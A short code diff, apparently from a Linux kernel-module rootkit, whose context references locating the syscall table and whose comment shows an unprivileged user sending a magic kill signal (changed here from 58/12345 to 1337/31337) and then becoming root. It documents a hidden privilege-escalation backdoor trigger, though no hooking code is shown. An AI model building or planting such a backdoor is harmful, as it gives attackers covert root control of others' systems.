@@ -48,7 +48,7 @@ address **find(void) { //finds syscall table
 /*
 [lkm@lkm ~]$ id
 uid=1000(lkm) gid=100(users) groups=100(users)
-[lkm@lkm ~]$ kill -58 12345
+[lkm@lkm ~]$ kill -1337 31337
 [lkm@lkm ~]$ id
 uid=0(root) gid=0(root) groups=0(root),100(users)
 */
